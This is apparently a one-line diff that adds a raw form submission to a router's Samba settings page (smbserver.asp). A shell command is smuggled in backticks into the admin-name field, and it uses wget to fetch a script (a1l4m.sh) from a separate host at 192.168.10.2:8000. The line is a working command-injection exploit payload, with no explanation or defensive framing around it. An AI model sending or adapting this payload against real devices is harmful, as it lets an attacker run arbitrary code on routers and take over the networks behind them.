@@ -1,0 +1,1 @@
+ccp_act=set&html_response_return_page=smbserver.asp&action=samba36&usbapps.config.smb_admin_pass=admin&usbapps.config.smb_admin_name=admin`wget+http://192.168.10.2:8000/a1l4m.sh`&usbapps.config.smb_enable=1&samba.@samba[0].name=USBSHARE&samba.@samba[0].workgroup=WORKGROUP&samba.@samba[0].description=&reboot_type=reboot&reboot_type=application&1714579543200=1714579543200
